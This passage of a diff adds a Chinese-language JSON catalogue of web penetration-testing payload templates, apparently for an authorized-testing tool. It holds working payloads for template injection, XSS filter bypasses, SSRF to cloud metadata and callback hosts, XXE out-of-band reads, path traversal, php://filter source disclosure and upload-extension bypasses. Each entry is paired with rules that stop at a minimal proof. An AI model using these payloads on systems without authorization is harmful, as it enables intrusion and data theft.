+            "模板引擎继续解析 7*7"
+          ],
+          "risk": "low",
+          "note": "只改变传输编码，不改变算术表达式。",
+          "applicableWhen": "已授权的模板算术探测。"
+        },
+        {
+          "id": "ssti-double-url-encode",
+          "technique": "双重 URL 编码",
+          "template": "%257b%257b7%252a7%257d%257d",
+          "decodeSteps": [
+            "第一次解码得到单次编码形式",
+            "第二次解码恢复 {{7*7}}"
+          ],
+          "risk": "low",
+          "note": "一次解码只还原到单次编码；用于识别重复解码。",
+          "applicableWhen": "已授权的模板算术探测。"
+        },
+        {
+          "id": "ssti-partial-encode",
+          "technique": "局部 URL 编码（仅模板定界符）",
+          "template": "%7b%7b7*7%7d%7d",
+          "decodeSteps": [
+            "接收端执行 URL 解码",
+            "定界符恢复为 { }"
+          ],
+          "risk": "low",
+          "note": "只编码定界符，保留 7*7 可读。",
+          "applicableWhen": "已授权的模板算术探测。"
+        },
+        {
+          "id": "ssti-whitespace-padded",
+          "technique": "表达式内空白填充",
+          "template": "{{ 7*7 }}",
+          "decodeSteps": [
+            "模板引擎忽略定界符内空白",
+            "表达式仍按 7*7 求值"
+          ],
+          "risk": "low",
+          "note": "只适用于允许表达式内空白的模板引擎。",
+          "applicableWhen": "已授权的模板算术探测，且引擎允许定界符内空白。"
+        }
+      ],
+      "stop": "只做算术探测；不执行系统命令、不读文件；确认引擎后停止。"
+    },
+    {
+      "id": "ssti-rce-reference",
+      "category": "injection/ssti",
+      "title": "SSTI 引擎利用链（确认即停）",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-search"
+      ],
+      "signals": [
+        "template",
+        "ssti",
+        "rce",
+        "jinja",
+        "twig",
+        "freemarker"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-ssti-rce",
+      "variants": [
+        {
+          "id": "clown-ssti-rce",
+          "source": "clown:injection-test.md#常见框架利用",
+          "label": "Jinja2/Twig/FreeMarker 对象链",
+          "template": "{{config}} / {{''.__class__.__mro__[...]}} / FreeMarker Execute",
+          "verify": "仅用于理解影响面；不自动执行",
+          "score": 4,
+          "reason": "内容完整但属于高影响利用链，只保留为人工审查参考"
+        }
+      ],
+      "stop": "只执行到确认命令执行（如 id/whoami/echo）即停止；不读文件、不持久化、不横向。"
+    },
+    {
+      "id": "xss-reflected-basic",
+      "category": "xss/reflected",
+      "title": "反射型 XSS 基础验证",
+      "assetTypes": [
+        "web",
+        "miniprogram",
+        "app"
+      ],
+      "scenarios": [
+        "web-search",
+        "web-content",
+        "mobile-webview"
+      ],
+      "signals": [
+        "xss",
+        "reflection",
+        "search",
+        "query",
+        "回显"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-xss-basic",
+      "variants": [
+        {
+          "id": "clown-xss-basic",
+          "source": "clown:xss-test.md#基础 Payload",
+          "label": "script/img/svg/iframe/details",
+          "template": "<script>alert(1)</script> / <img src=x onerror=alert(1)> / <svg onload=alert(1)>",
+          "verify": "脚本执行或 DOM 中出现未编码标签",
+          "score": 5,
+          "reason": "覆盖标签、事件、iframe 和 details，适用面最广"
+        },
+        {
+          "id": "report-xss-autofocus",
+          "source": "report:xss-reflected#c9e2337a",
+          "label": "属性闭合 autofocus",
+          "template": "' autofocus onfocus=alert(1) x='",
+          "verify": "输入进入属性值时触发 onfocus",
+          "score": 4,
+          "reason": "适合属性上下文，但覆盖面对比 clown 基础集更窄"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "xss-url-encode",
+          "technique": "URL 编码",
+          "template": "%3cscript%3ealert(1)%3c%2fscript%3e",
+          "decodeSteps": [
+            "接收端执行一次 URL 解码",
+            "恢复原始标签"
+          ],
+          "risk": "low",
+          "note": "只改变传输编码；不引入外部脚本地址。",
+          "applicableWhen": "已授权的反射型 XSS 弹窗验证。"
+        },
+        {
+          "id": "xss-double-url-encode",
+          "technique": "双重 URL 编码",
+          "template": "%253cscript%253ealert(1)%253c%252fscript%253e",
+          "decodeSteps": [
+            "第一次解码得到单次编码形式",
+            "第二次解码恢复原始标签"
+          ],
+          "risk": "low",
+          "note": "一次解码只还原到单次编码；用于识别重复解码。",
+          "applicableWhen": "已授权的反射型 XSS 弹窗验证。"
+        },
+        {
+          "id": "xss-unicode-escape",
+          "technique": "Unicode 转义（JS 字符串上下文）",
+          "template": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+          "decodeSteps": [
+            "JavaScript 字符串解析器还原 \\uXXXX",
+            "仅在字符串上下文恢复标签语义"
+          ],
+          "risk": "low",
+          "note": "只适用于 JavaScript 字符串上下文；HTML 正文不会按同样方式还原。",
+          "applicableWhen": "已授权的 JS 字符串上下文 XSS 验证。"
+        },
+        {
+          "id": "xss-fullwidth",
+          "technique": "全角字符归一化",
+          "template": "＜script＞alert(1)＜/script＞",
+          "decodeSteps": [
+            "接收端执行 NFKC 或自定义归一化",
+            "全角标点恢复为 ASCII 后再进入 HTML 解析"
+          ],
+          "risk": "medium",
+          "note": "未归一化时通常不会执行，只用于观察归一化差异。",
+          "applicableWhen": "仅用于已授权的归一化观察，不能当作可用结论。"
+        },
+        {
+          "id": "xss-entity",
+          "technique": "HTML 实体编码",
+          "template": "&lt;script&gt;alert(1)&lt;/script&gt;",
+          "decodeSteps": [
+            "接收端执行 HTML 实体解码",
+            "在属性或二次解码上下文中恢复字符"
+          ],
+          "risk": "low",
+          "note": "实体形式不包含原始尖括号标签，适合观察二次解码。",
+          "applicableWhen": "已授权的反射/属性上下文 XSS 验证。"
+        },
+        {
+          "id": "xss-hex-entity",
+          "technique": "十六进制实体编码",
+          "template": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+          "decodeSteps": [
+            "接收端执行十六进制实体解码",
+            "在属性或二次解码上下文中恢复字符"
+          ],
+          "risk": "low",
+          "note": "使用 &#xNN; 形式；不包含原始尖括号标签。",
+          "applicableWhen": "已授权的反射/属性上下文 XSS 验证。"
+        }
+      ],
+      "stop": "只弹窗证明；不窃取 Cookie、不调用外部回调；存储型需用自有测试账号。"
+    },
+    {
+      "id": "xss-attribute-break",
+      "category": "xss/attribute",
+      "title": "XSS 属性闭合",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-search",
+        "web-content"
+      ],
+      "signals": [
+        "xss",
+        "attribute",
+        "quote",
+        "onmouseover",
+        "input"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-attribute",
+      "variants": [
+        {
+          "id": "clown-attribute",
+          "source": "clown:xss-test.md#基础 Payload",
+          "label": "单双引号闭合 + 事件",
+          "template": "\" onmouseover=\"alert(1) / ' onmouseover='alert(1) / \"><img src=x onerror=alert(1)>",
+          "verify": "属性被闭合且事件触发",
+          "score": 5,
+          "reason": "覆盖双引号、单引号和标签闭合三种上下文"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "xss-url-encode",
+          "technique": "URL 编码",
+          "template": "%22%20onmouseover%3d%22alert(1)",
+          "decodeSteps": [
+            "接收端执行一次 URL 解码",
+            "恢复引号和事件属性"
+          ],
+          "risk": "low",
+          "note": "只改变传输编码；不读取页面数据。",
+          "applicableWhen": "已授权的属性闭合验证。"
+        },
+        {
+          "id": "xss-double-url-encode",
+          "technique": "双重 URL 编码",
+          "template": "%2522%2520onmouseover%253d%2522alert(1)",
+          "decodeSteps": [
+            "第一次解码得到单次编码形式",
+            "第二次解码恢复引号和事件"
+          ],
+          "risk": "low",
+          "note": "一次解码只还原到单次编码；用于识别重复解码。",
+          "applicableWhen": "已授权的属性闭合验证。"
+        },
+        {
+          "id": "xss-case-mixed",
+          "technique": "事件属性大小写混写",
+          "template": "\" oNmOuSeOvEr=\"alert(1)",
+          "decodeSteps": [
+            "HTML 解析器按大小写不敏感识别事件名",
+            "恢复 onmouseover 语义"
+          ],
+          "risk": "low",
+          "note": "只改变事件名大小写，不引入外部脚本。",
+          "applicableWhen": "已授权的属性闭合验证。"
+        },
+        {
+          "id": "xss-entity",
+          "technique": "HTML 实体编码",
+          "template": "&quot; onmouseover=&quot;alert(1)",
+          "decodeSteps": [
+            "接收端执行 HTML 实体解码",
+            "在二次解码上下文中恢复引号"
+          ],
+          "risk": "low",
+          "note": "实体形式不包含原始引号，仅用于观察二次解码。",
+          "applicableWhen": "已授权的属性闭合验证。"
+        },
+        {
+          "id": "xss-hex-entity",
+          "technique": "十六进制实体编码",
+          "template": "&#x22; onmouseover=&#x22;alert(1)",
+          "decodeSteps": [
+            "接收端执行十六进制实体解码",
+            "在二次解码上下文中恢复引号"
+          ],
+          "risk": "low",
+          "note": "使用 &#xNN; 形式；不包含原始引号。",
+          "applicableWhen": "已授权的属性闭合验证。"
+        },
+        {
+          "id": "xss-fullwidth",
+          "technique": "全角引号归一化",
+          "template": "＂ onmouseover=＂alert(1)",
+          "decodeSteps": [
+            "接收端执行 NFKC 或自定义归一化",
+            "全角引号恢复为 ASCII 引号"
+          ],
+          "risk": "medium",
+          "note": "未归一化时通常不会闭合属性，只用于观察归一化差异。",
+          "applicableWhen": "仅用于已授权的归一化观察。"
+        }
+      ],
+      "stop": "只弹窗；不读取页面敏感数据；存储型只用自己的测试资料。"
+    },
+    {
+      "id": "xss-waf-bypass",
+      "category": "xss/waf",
+      "title": "XSS WAF 绕过",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-search",
+        "web-content"
+      ],
+      "signals": [
+        "xss",
+        "waf",
+        "filter",
+        "encoding",
+        "拦截"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-xss-waf",
+      "variants": [
+        {
+          "id": "clown-xss-waf",
+          "source": "clown:xss-test.md#WAF 绕过 Payload",
+          "label": "大小写/事件/编码/注释/反引号",
+          "template": "<ScRiPt>alert(1)</ScRiPt> / <input autofocus onfocus=alert(1)> / &#97;&#108;&#101;&#114;&#116;(1)",
+          "verify": "过滤被绕过且脚本执行",
+          "score": 5,
+          "reason": "给出 5 类绕过方向，比单一编码更完整"
+        }
+      ],
+      "stop": "只做弹窗验证；不加载外部脚本；不绕过 CSP 后窃取数据。"
+    },
+    {
+      "id": "xss-dom",
+      "category": "xss/dom",
+      "title": "DOM XSS 查找",
+      "assetTypes": [
+        "web",
+        "miniprogram",
+        "app"
+      ],
+      "scenarios": [
+        "web-search",
+        "mobile-webview"
+      ],
+      "signals": [
+        "dom",
+        "innerhtml",
+        "document.write",
+        "eval",
+        "spa"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-dom",
+      "variants": [
+        {
+          "id": "clown-dom",
+          "source": "clown:xss-test.md#DOM XSS 查找",
+          "label": "source → sink 映射",
+          "template": "innerHTML / document.write / eval / location.hash / postMessage",
+          "verify": "可控 source 进入危险 sink",
+          "score": 5,
+          "reason": "给出 source/sink 清单，适合 SPA 和前端路由"
+        }
+      ],
+      "stop": "只做弹窗或 DOM 标记；不读取 localStorage/Token；不调用业务写接口。"
+    },
+    {
+      "id": "xss-stored",
+      "category": "xss/stored",
+      "title": "存储型 XSS 验证",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-content"
+      ],
+      "signals": [
+        "stored",
+        "profile",
+        "comment",
+        "nickname",
+        "filename"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-stored",
+      "variants": [
+        {
+          "id": "clown-stored",
+          "source": "clown:xss-test.md#常见注入点",
+          "label": "资料/评论/文件名/通知",
+          "template": "<img src=x onerror=alert(1)>",
+          "verify": "保存后在展示页触发",
+          "score": 4,
+          "reason": "列出存储型常见入口，适合按业务面选点"
+        }
+      ],
+      "stop": "只在自有测试账号和测试数据中验证；不向他人页面注入；验证后清理测试数据。"
+    },
+    {
+      "id": "ssrf-dnslog",
+      "category": "ssrf/callback",
+      "title": "SSRF DNS/HTTP 回调验证",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "web-cloud"
+      ],
+      "signals": [
+        "ssrf",
+        "url",
+        "imageurl",
+        "webhook",
+        "callback",
+        "dnslog"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-dnslog",
+      "variants": [
+        {
+          "id": "clown-dnslog",
+          "source": "clown:ssrf-test.md#使用 DNSLog 验证",
+          "label": "DNSLog/CEye/Interactsh",
+          "template": "url=http://<UNIQUE_ID>.dnslog.cn/test",
+          "verify": "回调平台出现 DNS 查询",
+          "score": 5,
+          "reason": "无需公网服务器，最适合无回显 SSRF"
+        },
+        {
+          "id": "report-ssrf-webhook",
+          "source": "report:ssrf-callback#70ee2e36",
+          "label": "webhook.site 回显",
+          "template": "url=https://webhook.site/<UNIQUE_ID>",
+          "verify": "收集端出现请求，且业务响应解析了回调内容",
+          "score": 5,
+          "reason": "能同时证明请求发出和响应解析，证据更强"
+        }
+      ],
+      "stop": "只请求自己的回调地址；不扫描内网、不读云元数据；确认后停止。"
+    },
+    {
+      "id": "ssrf-cloud-metadata",
+      "category": "ssrf/cloud",
+      "title": "SSRF 云元数据读取",
+      "assetTypes": [
+        "web",
+        "api",
+        "cloud"
+      ],
+      "scenarios": [
+        "web-cloud"
+      ],
+      "signals": [
+        "ssrf",
+        "metadata",
+        "169.254.169.254",
+        "100.100.100.200",
+        "iam",
+        "sts"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-metadata",
+      "variants": [
+        {
+          "id": "clown-metadata",
+          "source": "clown:ssrf-test.md#云服务 Metadata",
+          "label": "AWS/Aliyun/GCP 元数据路径",
+          "template": "http://169.254.169.254/latest/meta-data/ / http://100.100.100.200/latest/meta-data/",
+          "verify": "回显实例/角色信息，或稳定超时差异",
+          "score": 5,
+          "reason": "覆盖三家云和角色凭证路径，比单一路径完整"
+        },
+        {
+          "id": "report-ssrf-metadata",
+          "source": "report:ssrf-cloud#70ee2e36",
+          "label": "100.100.100.200 超时差分",
+          "template": "http://100.100.100.200/latest/meta-data/",
+          "verify": "与公网地址响应时间/状态码对照",
+          "score": 4,
+          "reason": "给出阿里云元数据的超时判据，但没有角色凭证路径"
+        }
+      ],
+      "stop": "只读元数据目录；不取临时凭证、不调用云 API、不横向；拿到角色名即停。"
+    },
+    {
+      "id": "ssrf-internal-port",
+      "category": "ssrf/internal",
+      "title": "SSRF 内网端口探测",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-cloud"
+      ],
+      "signals": [
+        "ssrf",
+        "internal",
+        "port",
+        "redis",
+        "mysql",
+        "内网"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-internal",
+      "variants": [
+        {
+          "id": "clown-internal",
+          "source": "clown:ssrf-test.md#内网探测",
+          "label": "常见内网服务端口",
+          "template": "http://<INTERNAL_IP>:6379/ / :27017/ / :8080/ / :22/",
+          "verify": "响应时间、错误类型或协议回显差异",
+          "score": 4,
+          "reason": "覆盖常见服务，但只适合隔离环境"
+        }
+      ],
+      "stop": "仅在授权隔离环境；不做端口段扫描；发现内网服务即停，不发送协议命令。"
+    },
+    {
+      "id": "ssrf-redirect-follow",
+      "category": "ssrf/redirect",
+      "title": "SSRF 重定向绕过",
+      "assetTypes": [
+        "web",
+        "api",
+        "cloud"
+      ],
+      "scenarios": [
+        "web-cloud"
+      ],
+      "signals": [
+        "ssrf",
+        "redirect",
+        "302",
+        "location",
+        "follow"
+      ],
+      "risk": "high",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-redirect",
+      "variants": [
+        {
+          "id": "clown-redirect",
+          "source": "clown:ssrf-test.md#云厂商元数据路径差",
+          "label": "公网 302 跳到元数据",
+          "template": "http://<CALLBACK>/redirect?to=http://169.254.169.254/latest/meta-data/",
+          "verify": "代理跟随跳转后回显元数据或稳定超时",
+          "score": 4,
+          "reason": "覆盖“先公网后跳转”的过滤绕过"
+        }
+      ],
+      "stop": "只跳转到自己的回调或元数据根目录；不取凭证；确认后停止。"
+    },
+    {
+      "id": "xxe-classic",
+      "category": "xxe/classic",
+      "title": "XXE 文件读取",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-upload",
+        "web-api-json"
+      ],
+      "signals": [
+        "xml",
+        "xxe",
+        "doctype",
+        "entity",
+        "解析"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-xxe-classic",
+      "variants": [
+        {
+          "id": "clown-xxe-classic",
+          "source": "clown:xxe-test.md#基础 XXE",
+          "label": "外部实体读文件",
+          "template": "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/hostname\">]><x>&e;</x>",
+          "verify": "回包出现 hostname 内容",
+          "score": 5,
+          "reason": "用 hostname 做无害证明，避免直接读敏感文件"
+        }
+      ],
+      "stop": "只读 /etc/hostname 等无害文件；不读 /etc/passwd、密钥、业务数据；不写文件。"
+    },
+    {
+      "id": "xxe-oob",
+      "category": "xxe/oob",
+      "title": "XXE 带外验证",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-upload",
+        "web-api-json"
+      ],
+      "signals": [
+        "xml",
+        "xxe",
+        "oob",
+        "dtd",
+        "callback"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-xxe-oob",
+      "variants": [
+        {
+          "id": "clown-xxe-oob",
+          "source": "clown:xxe-test.md#盲 XXE",
+          "label": "参数实体 + 外部 DTD",
+          "template": "<!DOCTYPE x [<!ENTITY % p SYSTEM \"http://<CALLBACK>/e.dtd\">%p;]>",
+          "verify": "回调出现 DTD/实体请求",
+          "score": 5,
+          "reason": "适合无回显场景，使用自己的回调"
+        }
+      ],
+      "stop": "只回调自己的域名；不读取业务文件；不发起内网请求。"
+    },
+    {
+      "id": "path-traversal-basic",
+      "category": "path-traversal",
+      "title": "路径穿越基础验证",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-upload"
+      ],
+      "signals": [
+        "path",
+        "file",
+        "download",
+        "traversal",
+        "读取"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-traversal-basic",
+      "variants": [
+        {
+          "id": "clown-traversal-basic",
+          "source": "clown:path-traversal-lfi-test.md#基础",
+          "label": "相对路径 + 编码",
+          "template": "../../../../etc/hostname / ..%2f..%2f..%2fetc%2fhostname",
+          "verify": "回包出现 hostname",
+          "score": 5,
+          "reason": "覆盖明文和 URL 编码，证明边界"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "lfi-url-encode",
+          "technique": "URL 编码（..%2f）",
+          "template": "..%2f..%2f..%2f<FILE>",
+          "decodeSteps": [
+            "接收端执行一次 URL 解码",
+            "%2f 还原为 /",
+            "路径恢复为 ../ 后进入规范化"
+          ],
+          "risk": "low",
+          "note": "只编码斜杠和特殊字符，保留点号可读性。",
+          "applicableWhen": "已授权的只读文件读取模板，且接收端会做 URL 解码。"
+        },
+        {
+          "id": "lfi-traversal-double-write",
+          "technique": "目录穿越双写 ....//",
+          "template": "....//....//....//<FILE>",
+          "decodeSteps": [
+            "中间件先剥离一次 ../",
+            "....// 归一化为 ../",
+            "再拼接目标文件"
+          ],
+          "risk": "medium",
+          "note": "依赖中间件先剥离一次 ../ 的行为；不是所有栈都会归一化。",
+          "applicableWhen": "已授权的路径穿越检查，且中间件会做 ../ 剥离。"
+        },
+        {
+          "id": "lfi-traversal-double-slash",
+          "technique": "目录穿越双斜杠 ..//",
+          "template": "..//..//..//<FILE>",
+          "decodeSteps": [
+            "接收端合并重复斜杠",
+            "合并后恢复为 ../",
+            "再进入路径规范化"
+          ],
+          "risk": "medium",
+          "note": "观察多斜杠合并顺序；部分服务器会在合并前拒绝路径。",
+          "applicableWhen": "已授权的路径穿越检查，且中间件会合并重复斜杠。"
+        },
+        {
+          "id": "lfi-traversal-double-encoded",
+          "technique": "%252e%252e%252f 双重编码穿越",
+          "template": "%252e%252e%252f%252e%252e%252f%252e%252e%252f<FILE>",
+          "decodeSteps": [
+            "第一次 URL 解码得到 %2e%2e%2f",
+            "第二次 URL 解码得到 ../",
+            "再进入路径规范化"
+          ],
+          "risk": "medium",
+          "note": "一次解码只还原到单次编码形式；需要两次解码才恢复路径语义。",
+          "applicableWhen": "已授权的路径穿越检查，且确认中间件可能重复解码。"
+        },
+        {
+          "id": "lfi-null-byte",
+          "technique": "空字节截断（历史兼容）",
+          "template": "../../../../<FILE>%00.txt",
+          "decodeSteps": [
+            "旧解析器在 %00 处截断字符串",
+            "截断后路径恢复为原始目标文件",
+            "扩展名校验看到的是 .txt"
+          ],
+          "risk": "medium",
+          "note": "仅作为旧系统兼容示例；现代 PHP 5.3.4+ 已不再接受 %00 截断，不能据此判断现代环境。",
+          "applicableWhen": "仅用于识别历史版本，不作为现代 PHP 的可用结论。"
+        }
+      ],
+      "stop": "只读 /etc/hostname；不读 /etc/passwd、源码、密钥；不写文件。"
+    },
+    {
+      "id": "path-traversal-nginx-alias",
+      "category": "path-traversal",
+      "title": "Nginx alias 缺斜杠穿越",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-upload"
+      ],
+      "signals": [
+        "nginx",
+        "alias",
+        "static",
+        "assets",
+        "download"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-nginx-alias",
+      "variants": [
+        {
+          "id": "clown-nginx-alias",
+          "source": "clown:path-traversal-lfi-test.md#Nginx alias 缺斜杠",
+          "label": "静态前缀 ../",
+          "template": "/static../<FILE>",
+          "verify": "读到静态目录外的配置或文件",
+          "score": 5,
+          "reason": "针对 alias 配置错误的专用模板"
+        }
+      ],
+      "stop": "只读公开配置或无害文件；不读密钥/业务数据；不写。"
+    },
+    {
+      "id": "lfi-php-filter",
+      "category": "path-traversal/lfi",
+      "title": "PHP filter 链读取源码",
+      "assetTypes": [
+        "web"
+      ],
+      "scenarios": [
+        "web-upload"
+      ],
+      "signals": [
+        "php",
+        "lfi",
+        "filter",
+        "include",
+        "源码"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-php-filter",
+      "variants": [
+        {
+          "id": "clown-php-filter",
+          "source": "clown:path-traversal-lfi-test.md#PHP filter",
+          "label": "php://filter base64",
+          "template": "php://filter/convert.base64-encode/resource=<FILE>",
+          "verify": "回包出现 base64 源码",
+          "score": 5,
+          "reason": "标准只读源码读取方式"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "lfi-url-encode",
+          "technique": "URL 编码",
+          "template": "php%3a%2f%2ffilter%2fconvert.base64-encode%2fresource=<FILE>",
+          "decodeSteps": [
+            "接收端执行一次 URL 解码",
+            "恢复 php://filter 包装器"
+          ],
+          "risk": "low",
+          "note": "只改变包装器传输编码，不改变只读读取目标。",
+          "applicableWhen": "已授权的 PHP filter 只读源码验证。"
+        },
+        {
+          "id": "lfi-double-url-encode",
+          "technique": "双重 URL 编码",
+          "template": "php%253a%252f%252ffilter%252fconvert.base64-encode%252fresource=<FILE>",
+          "decodeSteps": [
+            "第一次解码得到单次编码形式",
+            "第二次解码恢复 php://filter 包装器"
+          ],
+          "risk": "low",
+          "note": "一次解码只还原到单次编码；用于识别重复解码。",
+          "applicableWhen": "已授权的 PHP filter 只读源码验证。"
+        },
+        {
+          "id": "lfi-php-scheme-case",
+          "technique": "PHP 包装器大小写混写",
+          "template": "PhP://filter/convert.base64-encode/resource=<FILE>",
+          "decodeSteps": [
+            "接收端按大小写不敏感解析 php:// 包装器",
+            "恢复原始过滤链"
+          ],
+          "risk": "low",
+          "note": "仅在包装器大小写不敏感时保留语义。",
+          "applicableWhen": "已授权的 PHP filter 只读源码验证。"
+        },
+        {
+          "id": "lfi-null-byte",
+          "technique": "空字节截断（历史兼容）",
+          "template": "php://filter/convert.base64-encode/resource=<FILE>%00.txt",
+          "decodeSteps": [
+            "旧解析器在 %00 处截断字符串",
+            "截断后恢复原始 resource 路径"
+          ],
+          "risk": "medium",
+          "note": "仅作为旧系统兼容示例；现代 PHP 5.3.4+ 已不再接受 %00 截断。",
+          "applicableWhen": "仅用于识别历史版本，不作为现代 PHP 的可用结论。"
+        }
+      ],
+      "stop": "只读授权测试文件的源码；不读配置文件中的密钥；不写。"
+    },
+    {
+      "id": "upload-frontend-bypass",
+      "category": "upload/validation",
+      "title": "文件上传前端校验绕过",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-upload"
+      ],
+      "signals": [
+        "upload",
+        "file",
+        "filename",
+        "filetype",
+        "前端校验"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-upload-frontend",
+      "variants": [
+        {
+          "id": "clown-upload-flow",
+          "source": "clown:file-upload-test.md#测试流程",
+          "label": "先传正常文件看路径",
+          "template": "上传 <TEST>.txt → 记录存储路径/重命名/CDN",
+          "verify": "确认落盘位置与可访问性",
+          "score": 3,
+          "reason": "流程正确，但没有具体绕过字段"
+        },
+        {
+          "id": "report-upload-frontend",
+          "source": "report:upload-validation#ed6176ae",
+          "label": "改 fileName/fileType 绕过前端",
+          "template": "fileName=<TEST>.html; fileType=text/html",
+          "verify": "后端接受并可在公开路径访问",
+          "score": 5,
+          "reason": "来自真实报告，明确指出仅前端校验"
+        }
+      ],
+      "stop": "只上传无害文本/HTML 标记；不上传可执行脚本；验证后删除测试文件。"
+    },
+    {
+      "id": "upload-extension-bypass",
+      "category": "upload/extension",
+      "title": "文件扩展名/内容类型绕过",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-upload"
+      ],
+      "signals": [
+        "upload",
+        "extension",
+        "content-type",
+        "mime",
+        "白名单"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-upload-extension",
+      "variants": [
+        {
+          "id": "clown-upload-pointer",
+          "source": "clown:file-upload-test.md#测试流程",
+          "label": "按栈现场变后缀",
+          "template": "不提供固定后缀列表",
+          "verify": "观察解析/访问结果",
+          "score": 2,
+          "reason": "只有原则，没有可操作变体"
+        },
+        {
+          "id": "report-upload-extension",
+          "source": "report:upload-extension#e45aae89",
+          "label": "大小写/双后缀/Content-Type",
+          "template": "<TEST>.txt → <TEST>.html / <TEST>.html.txt / Content-Type: image/gif",
+          "verify": "后端按扩展名或 MIME 放行且文件可访问",
+          "score": 4,
+          "reason": "给出三类常见绕过，仍保持无害文件内容"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "upload-extension-case",
+          "technique": "扩展名大小写混写",
+          "template": "<TEST>.HTML",
+          "decodeSteps": [
+            "后端按大小写不敏感比较扩展名",
+            "静态文件按 HTML 解析"
+          ],
+          "risk": "low",
+          "note": "只上传无害 HTML/TXT 标记，不上传脚本内容。",
+          "applicableWhen": "已授权的无害文件上传验证。"
+        },
+        {
+          "id": "upload-extension-double",
+          "technique": "双扩展名",
+          "template": "<TEST>.html.txt",
+          "decodeSteps": [
+            "前端或中间件只检查最后一个扩展名",
+            "后端按第一个扩展名解析"
+          ],
+          "risk": "medium",
+          "note": "只使用无害标记文件；不覆盖他人文件。",
+          "applicableWhen": "已授权的无害文件上传验证。"
+        },
+        {
+          "id": "upload-extension-null-byte",
+          "technique": "空字节截断（历史兼容）",
+          "template": "<TEST>.html%00.txt",
+          "decodeSteps": [
+            "旧解析器在 %00 处截断",
+            "扩展名校验看到 .txt，实际路径为 .html"
+          ],
+          "risk": "medium",
+          "note": "仅作为旧系统兼容示例；现代 PHP 5.3.4+ 已不再接受 %00 截断。",
+          "applicableWhen": "仅用于识别历史版本，不作为现代 PHP 的可用结论。"
+        },
+        {
+          "id": "upload-extension-encoded-dot",
+          "technique": "扩展名点号编码",
+          "template": "<TEST>%2ehtml",
+          "decodeSteps": [
+            "接收端执行 URL 解码",
+            "点号恢复后按 .html 解析"
+          ],
+          "risk": "low",
+          "note": "只改变扩展名表达方式，文件内容保持无害。",
+          "applicableWhen": "已授权的无害文件上传验证，且接收端会解码文件名。"
+        },
+        {
+          "id": "upload-extension-trailing-dot",
+          "technique": "扩展名尾随点",
+          "template": "<TEST>.html.",
+          "decodeSteps": [
+            "部分系统忽略尾随点",
+            "规范化后按 .html 解析"
+          ],
+          "risk": "medium",
+          "note": "只在特定文件系统或中间件上成立；不上传可执行内容。",
+          "applicableWhen": "已授权的无害文件上传验证，且目标环境会忽略尾随点。"
+        }
+      ],
+      "stop": "只上传无害标记文件；不上传 WebShell；不覆盖他人文件；验证后删除。"
+    },
+    {
+      "id": "upload-unauth",
+      "category": "upload/auth",
+      "title": "未授权上传接口",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-upload"
+      ],
+      "signals": [
+        "upload",
+        "unauth",
+        "token",
+        "未授权",
+        "attach"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-upload-unauth",
+      "variants": [
+        {
+          "id": "clown-upload-auth",
+          "source": "clown:file-upload-test.md#测试流程",
+          "label": "先确认是否需要登录",
+          "template": "不带 Cookie/Token 上传 <TEST>.txt",
+          "verify": "接口返回成功且文件可访问",
+          "score": 3,
+          "reason": "原则正确，但未给未授权接口特征"
+        },
+        {
